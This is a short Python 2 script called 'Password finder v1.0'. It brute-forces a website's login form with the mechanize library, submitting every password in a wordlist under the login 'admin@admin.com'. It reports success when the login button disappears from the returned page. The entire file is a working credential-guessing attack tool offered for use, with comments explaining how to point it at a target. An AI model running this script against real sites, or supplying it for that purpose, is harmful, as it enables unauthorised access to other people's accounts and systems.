import mechanize
m = mechanize.Browser()

print "Password finder v1.0"
print "-----------------------"

# Enter correct website login page address.
url = "http://website.com/login_page"

# We need wodrlist with passwords, one password per row.
wordlist = "wordlist.txt"

found = 0

try:
    wordlist = open(wordlist, "r")
    print "Wordlist loaded."
    print "-----------------------"
except:
    print "Wordlist not found."
    quit()
    
print "Finding password..."

for password in wordlist:
    response = m.open(url)
    m.select_form(nr=0)

    # Enter name of input and login or email    
    m.form['name_of_input'] = 'admin@admin.com'    
    
    # Enter name of password input   
    m.form['password'] = password.strip()

    # Form method (GET, POST ...)     
    m.method = 'POST'
   
    response = m.submit()
    content = response.read()  

    # Checking returned content, we have to find some part
    # of code which one is only in login page
    # (Login button, Forgotten password link) for example:    
    
    find = '<button type="submit" class="btn btn-primary">Login</button>'    

    # If script can't find part of login page, probably pass was found.    
    if find not in content:
        print "Password found: " + password.strip()
        found = 1        
        break

if found == 1:
    print "Success."
else:
    print "Fail. Try again with different login or wordlist."
